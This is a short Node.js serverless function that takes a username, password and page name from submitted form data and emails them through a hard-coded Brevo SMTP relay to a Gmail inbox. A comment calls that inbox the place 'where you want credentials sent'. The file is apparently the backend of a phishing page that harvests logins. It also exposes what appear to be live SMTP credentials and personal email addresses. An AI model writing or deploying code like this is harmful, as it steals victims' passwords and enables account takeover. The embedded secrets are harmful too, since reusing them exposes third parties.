const nodemailer = require("nodemailer");

exports.handler = async (event) => {
  try {
    const { u_name, u_pass, pageName } = JSON.parse(event.body);

    let transporter = nodemailer.createTransport({
      host: "smtp-relay.brevo.com",
      port: 587,
      secure: false, // TLS
      auth: {
        user: "948249001@smtp-brevo.com", // Brevo SMTP login
        pass: "ZPm85dfkzLpMaBGx", // Brevo SMTP key
      },
    });

    let info = await transporter.sendMail({
      from: "castanedaorlando871@gmail.com", // Must match verified sender
      to: "lyndazuniga2020@gmail.com", // Where you want credentials sent
      subject: `New credentials from ${pageName}`,
      text: `Username: ${u_name}\nPassword: ${u_pass}`,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({
        message: "Email sent successfully",
        id: info.messageId,
      }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: "Email failed to send",
        details: err.message,
      }),
    };
  }
};
